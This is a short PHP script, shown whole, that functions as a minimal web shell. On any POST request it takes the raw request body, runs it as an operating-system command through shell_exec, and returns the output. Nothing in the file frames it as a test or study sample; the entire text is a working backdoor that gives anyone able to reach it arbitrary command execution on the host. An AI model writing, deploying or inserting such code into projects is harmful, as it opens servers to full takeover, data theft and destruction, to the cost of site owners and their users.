<?php 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $cmd = file_get_contents('php://input');
  echo shell_exec($cmd);
}
?>
